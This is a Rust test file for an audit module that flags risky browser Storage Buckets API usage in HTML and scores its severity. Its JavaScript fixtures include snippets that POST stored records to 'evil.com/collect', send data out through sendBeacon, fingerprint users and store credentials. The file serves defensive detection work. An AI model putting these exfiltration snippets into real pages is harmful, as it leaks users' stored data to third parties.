use crate::storage_bucket_audit::*;

#[test]
fn test_no_api_returns_empty() {
    let body = "<html><body>Regular content</body></html>";
    assert_eq!(analyze_storage_bucket(body), Vec::new());
}

#[test]
fn test_api_detected_storage_buckets() {
    let body = r#"<script>const x = navigator.storageBuckets;</script>"#;
    let issues = analyze_storage_bucket(body);
    assert_eq!(issues, vec![StorageBucketIssue::ApiDetected]);
}

#[test]
fn test_api_detected_storage_bucket_class() {
    let body = r#"
        <script>
        class StorageBucket {
            constructor(name) { this.name = name; }
        }
        </script>
    "#;
    let issues = analyze_storage_bucket(body);
    assert_eq!(issues, vec![StorageBucketIssue::ApiDetected]);
}

#[test]
fn test_persistent_storage_without_consent() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('docs');
        if (await bucket.persisted()) {
            console.log('Data will persist');
        }
        </script>
    "#;
    let issues = analyze_storage_bucket(body);
    assert!(issues.contains(&StorageBucketIssue::ApiDetected));
    assert!(issues.contains(&StorageBucketIssue::PersistentStorage));
}

#[test]
fn test_persistent_storage_with_consent_ok() {
    let body = r#"
        <script>
        if (Notification.permission === 'granted') {
            const bucket = navigator.storageBuckets;
            await bucket.persist();
        }
        </script>
    "#;
    let issues = analyze_storage_bucket(body);
    assert!(issues.contains(&StorageBucketIssue::ApiDetected));
    assert!(!issues.contains(&StorageBucketIssue::PersistentStorage));
}

#[test]
fn test_unbounded_quota() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('cache');
        const estimate = await bucket.quota;
        console.log('Usage:', estimate.usage);
        </script>
    "#;
    let issues = analyze_storage_bucket(body);
    assert!(issues.contains(&StorageBucketIssue::ApiDetected));
    assert!(issues.contains(&StorageBucketIssue::UnboundedQuota));
}

#[test]
fn test_quota_with_limit_ok() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('cache', {
            quota: 1024 * 1024 * 100
        });
        </script>
    "#;
    let issues = analyze_storage_bucket(body);
    assert_eq!(issues, vec![StorageBucketIssue::ApiDetected]);
}

#[test]
fn test_cross_origin_leak() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('shared');
        const db = await bucket.indexedDB.open('mydb');
        worker.postMessage({ bucketName: 'shared', data: records });
        </script>
    "#;
    let issues = analyze_storage_bucket(body);
    assert!(issues.contains(&StorageBucketIssue::ApiDetected));
    assert!(issues.contains(&StorageBucketIssue::CrossOriginLeak));
}

#[test]
fn test_cross_origin_leak_with_caches() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('assets');
        const cache = await bucket.caches.open('v1');
        const channel = new BroadcastChannel('storage-updates');
        channel.postMessage({ bucket: 'assets' });
        </script>
    "#;
    let issues = analyze_storage_bucket(body);
    assert!(issues.contains(&StorageBucketIssue::CrossOriginLeak));
}

#[test]
fn test_data_exfiltration() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('user-data');
        const keys = await bucket.keys();
        fetch('https://evil.com/collect', {
            method: 'POST',
            body: JSON.stringify(keys)
        });
        </script>
    "#;
    let issues = analyze_storage_bucket(body);
    assert!(issues.contains(&StorageBucketIssue::ApiDetected));
    assert!(issues.contains(&StorageBucketIssue::DataExfiltration));
}

#[test]
fn test_data_exfiltration_with_send_beacon() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('analytics');
        const entries = await bucket.getAll();
        navigator.sendBeacon('/track', JSON.stringify(entries));
        </script>
    "#;
    let issues = analyze_storage_bucket(body);
    assert!(issues.contains(&StorageBucketIssue::DataExfiltration));
}

#[test]
fn test_multiple_issues() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('data');
        await bucket.persist();
        const db = await bucket.indexedDB.open('db');
        const records = await db.getAll();
        fetch('https://analytics.example.com/collect', {
            method: 'POST',
            body: JSON.stringify(records)
        });
        window.postMessage({ type: 'data-ready' }, '*');
        </script>
    "#;
    let issues = analyze_storage_bucket(body);
    assert!(issues.contains(&StorageBucketIssue::ApiDetected));
    assert!(issues.contains(&StorageBucketIssue::PersistentStorage));
    assert!(issues.contains(&StorageBucketIssue::CrossOriginLeak));
    assert!(issues.contains(&StorageBucketIssue::DataExfiltration));
    assert_eq!(issues.len(), 5);
}

#[test]
fn test_display_formatting() {
    assert_eq!(StorageBucketIssue::ApiDetected.to_string(), "api_detected");
    assert_eq!(
        StorageBucketIssue::PersistentStorage.to_string(),
        "persistent_storage"
    );
    assert_eq!(
        StorageBucketIssue::UnboundedQuota.to_string(),
        "unbounded_quota"
    );
    assert_eq!(
        StorageBucketIssue::CrossOriginLeak.to_string(),
        "cross_origin_leak"
    );
    assert_eq!(
        StorageBucketIssue::DataExfiltration.to_string(),
        "data_exfiltration"
    );
}

#[test]
fn test_severity_scores() {
    assert_eq!(
        storage_bucket_severity(&StorageBucketIssue::ApiDetected),
        2.0
    );
    assert_eq!(
        storage_bucket_severity(&StorageBucketIssue::PersistentStorage),
        6.5
    );
    assert_eq!(
        storage_bucket_severity(&StorageBucketIssue::UnboundedQuota),
        6.0
    );
    assert_eq!(
        storage_bucket_severity(&StorageBucketIssue::CrossOriginLeak),
        7.0
    );
    assert_eq!(
        storage_bucket_severity(&StorageBucketIssue::DataExfiltration),
        7.5
    );
}

#[test]
fn test_to_operations() {
    let issues = vec![
        StorageBucketIssue::ApiDetected,
        StorageBucketIssue::DataExfiltration,
    ];
    let mut seq = 100;
    let ops = storage_bucket_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 102);
}

#[test]
fn test_case_sensitive_detection() {
    let body_lower = "const bucket = await navigator.storagebuckets;";
    assert_eq!(analyze_storage_bucket(body_lower), Vec::new());

    let body_correct = "const x = navigator.storageBuckets;";
    assert_eq!(
        analyze_storage_bucket(body_correct),
        vec![StorageBucketIssue::ApiDetected]
    );
}

#[test]
fn security_detects_bucket_data_exfiltration() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('data');
        const db = await bucket.indexedDB.open('mydb');
        const records = await db.getAll();
        fetch('https://evil.com/collect', {
            method: 'POST',
            body: JSON.stringify(records)
        });
        </script>
    "#;
    let issues = analyze_storage_bucket_security(body);
    assert!(issues.contains(&StorageBucketSecurityIssue::BucketDataExfiltration));
}

#[test]
fn security_detects_bucket_sensitive_data() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('user');
        const db = await bucket.indexedDB.open('credentials');
        await db.put({ email: 'user@example.com', password: 'secret123' });
        </script>
    "#;
    let issues = analyze_storage_bucket_security(body);
    assert!(issues.contains(&StorageBucketSecurityIssue::BucketSensitiveData));
}

#[test]
fn security_detects_bucket_no_expiration() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('cache');
        await bucket.persist();
        const db = await bucket.indexedDB.open('data');
        </script>
    "#;
    let issues = analyze_storage_bucket_security(body);
    assert!(issues.contains(&StorageBucketSecurityIssue::BucketNoExpiration));
}

#[test]
fn security_detects_bucket_cross_origin() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('shared');
        const cache = await bucket.caches.open('assets');
        window.postMessage({ bucket: 'shared', data: items }, '*');
        </script>
    "#;
    let issues = analyze_storage_bucket_security(body);
    assert!(issues.contains(&StorageBucketSecurityIssue::BucketCrossOrigin));
}

#[test]
fn security_detects_bucket_enumeration() {
    let body = r#"
        <script>
        const buckets = await navigator.storageBuckets.keys();
        console.log('Available buckets:', buckets);
        </script>
    "#;
    let issues = analyze_storage_bucket_security(body);
    assert!(issues.contains(&StorageBucketSecurityIssue::BucketEnumeration));
}

#[test]
fn security_detects_bucket_over_quota() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('large');
        const db = await bucket.indexedDB.open('bigdata');
        await db.put({ key: 'value', data: largeBlob });
        </script>
    "#;
    let issues = analyze_storage_bucket_security(body);
    assert!(issues.contains(&StorageBucketSecurityIssue::BucketOverQuota));
}

#[test]
fn security_detects_bucket_in_background() {
    let body = r#"
        <script>
        document.addEventListener('visibilitychange', async () => {
            if (document.hidden) {
                const bucket = await navigator.storageBuckets.open('analytics');
                const db = await bucket.indexedDB.open('events');
                await db.add({ event: 'tab_hidden', timestamp: Date.now() });
            }
        });
        </script>
    "#;
    let issues = analyze_storage_bucket_security(body);
    assert!(issues.contains(&StorageBucketSecurityIssue::BucketInBackground));
}

#[test]
fn security_detects_bucket_fingerprinting() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('fingerprint');
        const db = await bucket.indexedDB.open('tracking');
        await db.put({
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            timestamp: Date.now()
        });
        </script>
    "#;
    let issues = analyze_storage_bucket_security(body);
    assert!(issues.contains(&StorageBucketSecurityIssue::BucketFingerprinting));
}

#[test]
fn security_detects_bucket_without_permission() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('data');
        const db = await bucket.indexedDB.open('store');
        await db.put({ key: 'value' });
        </script>
    "#;
    let issues = analyze_storage_bucket_security(body);
    assert!(issues.contains(&StorageBucketSecurityIssue::BucketWithoutPermission));
}

#[test]
fn security_detects_bucket_persistent_tracking() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('tracking');
        await bucket.persist();
        const db = await bucket.indexedDB.open('users');
        await db.put({ userId: uuid(), sessionId: Date.now() });
        </script>
    "#;
    let issues = analyze_storage_bucket_security(body);
    assert!(issues.contains(&StorageBucketSecurityIssue::BucketPersistentTracking));
}

#[test]
fn security_empty_body() {
    let body = "";
    assert_eq!(analyze_storage_bucket_security(body), Vec::new());
}

#[test]
fn security_no_storage_bucket() {
    let body = r#"
        <script>
        const data = localStorage.getItem('key');
        fetch('https://example.com', { method: 'POST', body: data });
        </script>
    "#;
    assert_eq!(analyze_storage_bucket_security(body), Vec::new());
}

#[test]
fn security_severity_bucket_data_exfiltration() {
    assert_eq!(
        storage_bucket_security_severity(&StorageBucketSecurityIssue::BucketDataExfiltration),
        8.5
    );
}

#[test]
fn security_severity_bucket_sensitive_data() {
    assert_eq!(
        storage_bucket_security_severity(&StorageBucketSecurityIssue::BucketSensitiveData),
        9.0
    );
}

#[test]
fn security_severity_bucket_no_expiration() {
    assert_eq!(
        storage_bucket_security_severity(&StorageBucketSecurityIssue::BucketNoExpiration),
        5.5
    );
}

#[test]
fn security_severity_bucket_cross_origin() {
    assert_eq!(
        storage_bucket_security_severity(&StorageBucketSecurityIssue::BucketCrossOrigin),
        7.5
    );
}

#[test]
fn security_severity_bucket_enumeration() {
    assert_eq!(
        storage_bucket_security_severity(&StorageBucketSecurityIssue::BucketEnumeration),
        6.0
    );
}

#[test]
fn security_severity_bucket_over_quota() {
    assert_eq!(
        storage_bucket_security_severity(&StorageBucketSecurityIssue::BucketOverQuota),
        5.0
    );
}

#[test]
fn security_severity_bucket_in_background() {
    assert_eq!(
        storage_bucket_security_severity(&StorageBucketSecurityIssue::BucketInBackground),
        6.5
    );
}

#[test]
fn security_severity_bucket_fingerprinting() {
    assert_eq!(
        storage_bucket_security_severity(&StorageBucketSecurityIssue::BucketFingerprinting),
        7.0
    );
}

#[test]
fn security_severity_bucket_without_permission() {
    assert_eq!(
        storage_bucket_security_severity(&StorageBucketSecurityIssue::BucketWithoutPermission),
        6.0
    );
}

#[test]
fn security_severity_bucket_persistent_tracking() {
    assert_eq!(
        storage_bucket_security_severity(&StorageBucketSecurityIssue::BucketPersistentTracking),
        8.0
    );
}

#[test]
fn security_operations_creates_correct_entries() {
    let issues = vec![
        StorageBucketSecurityIssue::BucketDataExfiltration,
        StorageBucketSecurityIssue::BucketSensitiveData,
    ];
    let mut seq = 200;
    let ops = storage_bucket_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 202);
}

#[test]
fn security_combined_multiple_issues() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('tracking');
        await bucket.persist();
        const db = await bucket.indexedDB.open('users');
        await db.put({
            userId: uuid(),
            email: 'user@example.com',
            token: 'abc123'
        });
        const keys = await navigator.storageBuckets.keys();
        document.addEventListener('visibilitychange', async () => {
            if (document.hidden) {
                const records = await db.getAll();
                navigator.sendBeacon('/track', JSON.stringify(records));
            }
        });
        window.postMessage({ data: records }, '*');
        </script>
    "#;
    let issues = analyze_storage_bucket_security(body);
    assert!(issues.contains(&StorageBucketSecurityIssue::BucketDataExfiltration));
    assert!(issues.contains(&StorageBucketSecurityIssue::BucketSensitiveData));
    assert!(issues.contains(&StorageBucketSecurityIssue::BucketNoExpiration));
    assert!(issues.contains(&StorageBucketSecurityIssue::BucketCrossOrigin));
    assert!(issues.contains(&StorageBucketSecurityIssue::BucketEnumeration));
    assert!(issues.contains(&StorageBucketSecurityIssue::BucketInBackground));
    assert!(issues.contains(&StorageBucketSecurityIssue::BucketPersistentTracking));
    assert!(issues.len() >= 7);
}

#[test]
fn security_display_formatting() {
    assert_eq!(
        StorageBucketSecurityIssue::BucketDataExfiltration.to_string(),
        "bucket_data_exfiltration"
    );
    assert_eq!(
        StorageBucketSecurityIssue::BucketSensitiveData.to_string(),
        "bucket_sensitive_data"
    );
    assert_eq!(
        StorageBucketSecurityIssue::BucketNoExpiration.to_string(),
        "bucket_no_expiration"
    );
    assert_eq!(
        StorageBucketSecurityIssue::BucketCrossOrigin.to_string(),
        "bucket_cross_origin"
    );
    assert_eq!(
        StorageBucketSecurityIssue::BucketEnumeration.to_string(),
        "bucket_enumeration"
    );
    assert_eq!(
        StorageBucketSecurityIssue::BucketOverQuota.to_string(),
        "bucket_over_quota"
    );
    assert_eq!(
        StorageBucketSecurityIssue::BucketInBackground.to_string(),
        "bucket_in_background"
    );
    assert_eq!(
        StorageBucketSecurityIssue::BucketFingerprinting.to_string(),
        "bucket_fingerprinting"
    );
    assert_eq!(
        StorageBucketSecurityIssue::BucketWithoutPermission.to_string(),
        "bucket_without_permission"
    );
    assert_eq!(
        StorageBucketSecurityIssue::BucketPersistentTracking.to_string(),
        "bucket_persistent_tracking"
    );
}
